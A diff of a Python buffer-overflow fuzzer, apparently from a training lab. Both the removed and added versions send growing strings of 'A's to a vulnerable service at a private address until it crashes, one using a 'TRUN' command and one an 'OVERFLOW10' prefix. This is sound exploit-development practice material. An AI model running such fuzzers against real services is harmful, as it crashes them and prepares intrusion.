@@ -1,25 +1,26 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
-import sys, socket
-from time import sleep 
+import socket, time, sys
 
-buffer = "A" * 50 
+ip = "10.10.28.152"
 
+port = 1337
+timeout = 5
+prefix = "OVERFLOW10 "
+
+string = prefix + "A" * 100
 
 while True:
-	try: 
-		payload = "TRUN /.:/" + buffer
-		
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(('172.16.93.132', 9999))
-		print ("[+] Sending the Payload.... " + str(len(buffer)))		
-		
-		s.send((payload.encode()))
-		s.close()
-		sleep(1)
-		
-		buffer = buffer + "A"*50
-	except:
-		print ("[+] Fuzzing crashed at %s Characters...." % str(len(buffer)))
-		sys.exit()
-	  
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
